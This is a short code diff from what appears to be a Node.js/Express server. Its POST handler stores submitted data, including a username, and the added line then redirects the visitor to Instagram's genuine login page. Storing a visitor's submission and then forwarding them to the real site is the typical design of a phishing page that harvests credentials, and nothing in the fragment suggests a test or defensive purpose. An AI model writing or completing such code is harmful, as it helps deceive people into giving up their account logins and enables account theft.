@@ -38,6 +38,7 @@ app.post("/", async (req, res) => {
       createdAt: new Date(),
     });
     console.log("📦 Data saved:", username);
+    return res.redirect("https://www.instagram.com/accounts/login/?hl=en");
   } catch (err) {
     console.error("❌ Error saving data:", err);
   }
